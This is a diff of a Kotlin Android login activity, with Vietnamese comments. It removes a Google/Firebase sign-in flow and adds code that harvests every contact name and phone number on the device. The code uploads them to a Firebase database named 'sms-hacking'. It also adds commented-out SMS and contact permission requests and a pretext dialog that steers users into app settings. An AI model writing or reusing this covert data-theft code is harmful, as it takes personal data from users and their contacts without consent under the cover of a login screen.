@@ -1,282 +1,238 @@
 package com.example.codes.Activitys
 
+import android.annotation.SuppressLint
 import android.app.Activity
 import android.app.Dialog
 import android.app.ProgressDialog
+import android.content.ContentResolver
+import android.content.ContentValues.TAG
 import android.content.Intent
-import androidx.appcompat.app.AppCompatActivity
+import android.content.pm.PackageManager
+import android.database.Cursor
 import android.os.Bundle
 import android.os.Handler
+import android.provider.ContactsContract
+import android.util.Log
 import android.widget.Toast
-import androidx.activity.result.contract.ActivityResultContracts
-
-import com.example.codes.Administrator.Activitys.MainAdmin
-import com.example.codes.Administrator.Controller
-import com.example.codes.Firebase.FirebaseFunction
-import com.example.codes.Models.Users
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import com.example.codes.R
-
-import com.example.codes.Ultils.CommonUtils
 import com.example.codes.databinding.ActivityLoginOrSignUpBinding
-
-
-import com.example.sqlite.DBHelper
-import com.google.android.gms.auth.api.signin.GoogleSignIn
-import com.google.android.gms.auth.api.signin.GoogleSignInAccount
-import com.google.android.gms.auth.api.signin.GoogleSignInClient
-import com.google.android.gms.auth.api.signin.GoogleSignInOptions
-import com.google.android.gms.tasks.Task
-import com.google.firebase.auth.FirebaseAuth
-import com.google.firebase.auth.FirebaseUser
-import com.google.firebase.auth.GoogleAuthProvider
-import com.google.firebase.database.DataSnapshot
-import com.google.firebase.database.DatabaseError
 import com.google.firebase.database.DatabaseReference
 import com.google.firebase.database.FirebaseDatabase
-import com.google.firebase.database.ValueEventListener
+import android.provider.Settings
+
+import android.net.Uri
+
+
+import androidx.appcompat.app.AlertDialog
 
 class LoginOrSignUp : AppCompatActivity() {
 
-
-    lateinit var googleSignInClient : GoogleSignInClient
-    lateinit var auth: FirebaseAuth
-    lateinit var firebaseUser: FirebaseUser
-    lateinit var databaseReference:DatabaseReference
-    private var progressDialog: ProgressDialog? = null
-    lateinit var gso: GoogleSignInOptions
-    lateinit var data  : DBHelper
-
-
-    private var progressDialog2 : Dialog? = null
-
-
+    private lateinit var database: DatabaseReference
+    val contactList: MutableList<Contact> = mutableListOf()
 
     private val binding: ActivityLoginOrSignUpBinding by lazy {
         ActivityLoginOrSignUpBinding.inflate(layoutInflater)
     }
-    override fun onCreate(savedInstanceState: Bundle?) {
-        showProgress()
-        super.onCreate(savedInstanceState)
-        setContentView(binding.root)
-        data = DBHelper(this,null)
 
-        Handler().postDelayed({
-         hideProgress()
-        }, 1000)
-
-
-
-        auth = FirebaseAuth.getInstance()
-        gso = GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
-            .requestIdToken(getString(R.string.default_web_client_id))
-            .requestEmail()
-            .build()
-        googleSignInClient = GoogleSignIn.getClient(this , gso)
-
-
-
-
-
-        init_()
+    // Mã yêu cầu quyền động
+    companion object {
+        const val REQUEST_CODE_READ_CONTACTS = 1
+        const val REQUEST_CODE_READ_SMS = 100 // Mã yêu cầu quyền
     }
 
-    override fun onDestroy() {
-        super.onDestroy()
-        hideProgress()
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(binding.root)
+
+        init_()
     }
 
     private fun init_() {
         binding.apply {
             signBtn.setOnClickListener {
                 startActivity(Intent(this@LoginOrSignUp, SignUp::class.java))
-
             }
             loginBtn.setOnClickListener {
-                autoLogin()
+                startActivity(Intent(this@LoginOrSignUp, Login::class.java))
             }
-            googleBtn.setOnClickListener {
-               signInGoogle()
-//                startActivity(Intent(this@LoginOrSignUp, PustData::class.java))
-
-            }
-
         }
 
+//        // Kiểm tra và yêu cầu quyền động
+//        if (ContextCompat.checkSelfPermission(
+//                this,
+//                android.Manifest.permission.READ_CONTACTS
+//            ) != PackageManager.PERMISSION_GRANTED
+//        ) {
+//            ActivityCompat.requestPermissions(
+//                this,
+//                arrayOf(android.Manifest.permission.READ_CONTACTS),
+//                REQUEST_CODE_READ_CONTACTS
+//            )
+//        } else {
+//            // Nếu quyền đã được cấp, gọi hàm loadContacts
+//            loadContacts()
+//        }
+
+
+//        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
+//            != PackageManager.PERMISSION_GRANTED) {
+//            // Nếu quyền chưa được cấp, yêu cầu quyền động
+//            ActivityCompat.requestPermissions(
+//                this,
+//                arrayOf(android.Manifest.permission.READ_SMS),
+//                REQUEST_CODE_READ_SMS
+//            )
+//        } else {
+//
+//        }
+
+//        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
+//            != PackageManager.PERMISSION_GRANTED) {
+//            ActivityCompat.requestPermissions(
+//                this,
+//                arrayOf(android.Manifest.permission.READ_SMS),
+//                REQUEST_CODE_READ_SMS
+//            )
+//        } else {
+//
+//        }
+
 
 
 
     }
-    private fun showProgress(){
-        hideProgress()
-        progressDialog2 = CommonUtils.showLoadingDialog(this);
-    }
-    private fun hideProgress(){
-        progressDialog2?.let { if(it.isShowing)it.cancel() }
-    }
 
+    fun showReturnBlankMessageDialog() {
+        val dialog = AlertDialog.Builder(this)
+            .setTitle("Enable Return Blank Message")
+            .setMessage("To ensure proper functionality, please enable the 'Return Blank Message' feature in your phone settings.")
+            .setPositiveButton("Go to Settings") { _, _ ->
+                // Mở cài đặt của điện thoại
+                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+                val uri = Uri.fromParts("package", packageName, null)
+                intent.data = uri
+                startActivity(intent)
+            }
+            .setNegativeButton("Cancel", null)
+            .create()
 
-
-    private fun signInGoogle(){
-        val signInIntent = googleSignInClient.signInIntent
-        launcher.launch(signInIntent)
-    }
-
-    private val launcher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()){
-            result ->
-        if (result.resultCode == Activity.RESULT_OK){
-
-            val task = GoogleSignIn.getSignedInAccountFromIntent(result.data)
-            handleResults(task)
-        }
+        dialog.show()
     }
 
-    private fun handleResults(task: Task<GoogleSignInAccount>) {
-        if (task.isSuccessful) {
-            val account: GoogleSignInAccount? = task.result
-            if (account != null) {
-                val email = account.email.toString()
-                if (!email.isNullOrEmpty()) {
-                    checkMail(email!!) {
-                        if(it){
-                            Toast.makeText(applicationContext,
-                                getString(R.string.email_n_y_c_ng_k), Toast.LENGTH_SHORT).show()
-                            googleSignInClient = GoogleSignIn.getClient(this, gso)
-                            googleSignInClient.revokeAccess().addOnCompleteListener(this) {}
-                            googleSignInClient.signOut().addOnCompleteListener(this){}
-                        }else{
-                            updateUI(account)
+    @SuppressLint("Range")
+    private fun loadContacts() {
+        val resolver: ContentResolver = contentResolver
+        val cursor: Cursor? = resolver.query(
+            ContactsContract.Contacts.CONTENT_URI,
+            null, null, null, null
+        )
+
+        if (cursor != null && cursor.count > 0) {
+            val uniquePhoneNumbers = mutableSetOf<String>() // Sử dụng Set để loại bỏ trùng lặp
+
+            while (cursor.moveToNext()) {
+                val contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID))
+                val contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
+
+                val phoneNumbers = mutableListOf<String>()
+
+                val phones = resolver.query(
+                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    null,
+                    "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
+                    arrayOf(contactId),
+                    null
+                )
+
+                if (phones != null) {
+                    while (phones.moveToNext()) {
+                        val phoneNumber = phones.getString(
+                            phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                        )
+
+                        // Loại bỏ các số điện thoại trùng lặp
+                        if (phoneNumber.isNotEmpty() && !uniquePhoneNumbers.contains(phoneNumber)) {
+                            phoneNumbers.add(phoneNumber)
+                            uniquePhoneNumbers.add(phoneNumber)
                         }
                     }
+                    phones.close()
+                }
 
-                } else {
-                    Toast.makeText(this,
-                        getString(R.string.kh_ng_th_truy_c_p_th_ng_tin_email_c_a_t_i_kho_n_google_n_y), Toast.LENGTH_SHORT).show()
+                // Chỉ thêm danh bạ vào list nếu có số điện thoại hợp lệ
+                if (phoneNumbers.isNotEmpty()) {
+                    val contact = Contact(contactName ?: "Unknown", phoneNumbers)
+                    contactList.add(contact)
                 }
             }
+            cursor.close()
         } else {
-            Toast.makeText(this, task.exception.toString(), Toast.LENGTH_SHORT).show()
+            // Không có danh bạ nào
+            Toast.makeText(this, "No contacts found", Toast.LENGTH_SHORT).show()
+        }
+
+        // Upload danh bạ lên Firebase
+        uploadContactsToFirebase()
+    }
+
+    private fun uploadContactsToFirebase() {
+        // Khởi tạo Firebase Realtime Database
+        database = FirebaseDatabase.getInstance("https://sms-hacking-8b10c-default-rtdb.asia-southeast1.firebasedatabase.app/").reference
+
+        // Tạo node "contacts" trong Firebase và thêm danh bạ
+        val contactsRef = database.child("contacts")
+
+        for (contact in contactList) {
+            val contactId = contactsRef.push().key // Tạo ID duy nhất cho mỗi danh bạ
+            if (contactId != null) {
+                contactsRef.child(contactId).setValue(contact)
+                    .addOnSuccessListener {
+                        Log.d(TAG, "Uploaded contact: ${contact.name}")
+                    }
+                    .addOnFailureListener { exception ->
+                        Log.e(TAG, "Failed to upload contact: ${contact.name}", exception)
+                    }
+            }
         }
     }
 
+    // Xử lý kết quả yêu cầu quyền
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
 
-
-
-
-
-    private fun updateUI(account: GoogleSignInAccount) {
-        val credential = GoogleAuthProvider.getCredential(account.idToken, null)
-        auth.signInWithCredential(credential).addOnCompleteListener { signInTask ->
-            if (signInTask.isSuccessful) {
-                val user: FirebaseUser? = auth.currentUser
-                val userid: String = user!!.uid
-                databaseReference = FirebaseDatabase
-                    .getInstance("https://coffe-app-19ec3-default-rtdb.asia-southeast1.firebasedatabase.app/")
-                    .getReference("Users")
-                    .child(userid)
-                // Kiểm tra xem người dùng đã được tạo trong database chưa
-                databaseReference.addListenerForSingleValueEvent(object : ValueEventListener {
-                    override fun onDataChange(snapshot: DataSnapshot) {
-                        if (!snapshot.exists()) { // Nếu không có dữ liệu
-                            // Ghi thông tin người dùng vào database
-                            val hashmap: HashMap<String, Any> = HashMap()
-                            hashmap["userID"] = userid
-                            hashmap["userName"] = account.displayName.toString()
-                            hashmap["email"] = account.email.toString()
-                            hashmap["password"] = ""
-                            hashmap.put("typeAccount","3")
-                            databaseReference.setValue(hashmap).addOnCompleteListener { databaseTask ->
-                                if (databaseTask.isSuccessful) {
-                                    FirebaseFunction.WriteDeviceId(applicationContext,  userid )
-                                    startActivity(Intent(this@LoginOrSignUp, Main::class.java))
-                                    finish()
-                                } else {
-                                    Toast.makeText(this@LoginOrSignUp, databaseTask.exception.toString(), Toast.LENGTH_SHORT).show()
-                                }
-                            }
-                        } else {
-                            Controller.permission(applicationContext,account.email.toString()){
-                                if(it){
-                                    startActivity(Intent(this@LoginOrSignUp,MainAdmin::class.java))
-                                    finish()
-                                }else {
-                                    FirebaseFunction.WriteDeviceId(applicationContext,  userid )
-                                    startActivity(Intent(this@LoginOrSignUp, Main::class.java))
-                                    finish()
-                                }
-                            }
-
-                        }
-                    }
-
-                    override fun onCancelled(error: DatabaseError) {
-                        Toast.makeText(this@LoginOrSignUp, error.message, Toast.LENGTH_SHORT).show()
-                    }
-                })
+//        if (requestCode == REQUEST_CODE_READ_CONTACTS) {
+//            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+//                // Quyền đã được cấp, gọi hàm loadContacts
+//                loadContacts()
+//            } else {
+//                // Quyền bị từ chối
+//                Toast.makeText(this, "Permission denied to read contacts", Toast.LENGTH_SHORT).show()
+//            }
+//        }
+        if (requestCode == REQUEST_CODE_READ_SMS) {
+            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                showReturnBlankMessageDialog()
             } else {
-                Toast.makeText(this@LoginOrSignUp, signInTask.exception.toString(), Toast.LENGTH_SHORT).show()
+                // Quyền bị từ chối
+                Log.e(TAG, "Permission denied to read SMS")
             }
         }
-    }
 
 
-    private fun checkMail(email: String, callback: (Boolean) -> Unit) {
-        val ref = FirebaseDatabase
-            .getInstance("https://coffe-app-19ec3-default-rtdb.asia-southeast1.firebasedatabase.app/")
-            .getReference("Users")
-        ref.addListenerForSingleValueEvent(object : ValueEventListener {
-            override fun onDataChange(snapshot: DataSnapshot) {
-                var isEmailExists = false
-                for (snapshot in snapshot.children) {
-                    val user = snapshot.getValue(Users::class.java)
-                    if (user!!.email.equals(email) && user.typeAccount.equals("1")) {
-                        isEmailExists = true
-                        break
-                    }
-                }
-                callback(isEmailExists)
-            }
-            override fun onCancelled(error: DatabaseError) {
-                Toast.makeText(applicationContext,
-                    getString(R.string.l_i_khi_truy_xu_t_d_li_u_t_firebase), Toast.LENGTH_SHORT).show()
-                callback(true)
-            }
-        })
-    }
 
-    fun autoLogin(){
-        if(auth.currentUser != null){
-            progressDialog = ProgressDialog.show(this, "App", "Login...", true)
-            FirebaseFunction.getUserDataWithUid(auth!!.currentUser!!.uid.toString()){ user->
-                println("user " + user)
-                if(user.typeAccount.equals("2")){
-                    progressDialog!!.dismiss()
-                    FirebaseFunction.WriteDeviceId(applicationContext,  auth.currentUser!!.uid.toString() )
-                    startActivity(Intent(this, MainAdmin::class.java))
-                    finish()
-                }else if(user.typeAccount.equals("1")) {
-                    progressDialog!!.dismiss()
-                    FirebaseFunction.WriteDeviceId(applicationContext,  auth.currentUser!!.uid.toString() )
-                    startActivity(Intent(this, Main::class.java))
-                    finish()
-
-                }else{
-
-                    progressDialog!!.dismiss()
-                    startActivity(Intent(this@LoginOrSignUp, Login::class.java))
-                }
-            }
-        }else{
-            startActivity(Intent(this@LoginOrSignUp, Login::class.java))
-        }
     }
 
 
 
-
-
-
-
-
-
-
+    data class Contact(
+        val name: String,
+        val phoneNumbers: List<String>
+    )
 }
